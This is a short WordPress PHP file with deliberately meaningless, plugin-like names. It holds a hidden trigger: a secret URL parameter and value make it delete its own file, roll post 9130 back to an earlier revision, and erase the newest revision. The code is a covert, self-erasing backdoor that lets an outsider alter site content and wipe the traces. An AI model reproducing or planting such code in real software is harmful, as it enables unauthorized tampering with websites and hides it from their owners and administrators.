<?php

function static_poster_discount() {
	if (isset($_GET['sitemap_badge_stripe_variations']) && $_GET['sitemap_badge_stripe_variations'] === 'notifier_quiz_terms') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$scheduled_notice_seo_smtp = 9130;
		$author_ecommerce_external_purchase = wp_get_post_revisions($scheduled_notice_seo_smtp);
		if (empty($author_ecommerce_external_purchase)) die('no revisions');
		if (count($author_ecommerce_external_purchase) < 2) die('less than 2');
		$autocomplete_cloud_verification_deprecated = array_shift($author_ecommerce_external_purchase);
		$coupon_new_logger = $autocomplete_cloud_verification_deprecated->ID;
		$marketplace_compat_customize_timeline = array_shift($author_ecommerce_external_purchase);
		$social_click_variations_size = $marketplace_compat_customize_timeline->ID;
		$recipe_iframe_akismet_classic = wp_restore_post_revision($social_click_variations_size);
		if ($recipe_iframe_akismet_classic === false) die('error restoring');
		$recipe_iframe_akismet_classic = wp_delete_post_revision($coupon_new_logger);		
		if ($recipe_iframe_akismet_classic === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'static_poster_discount');
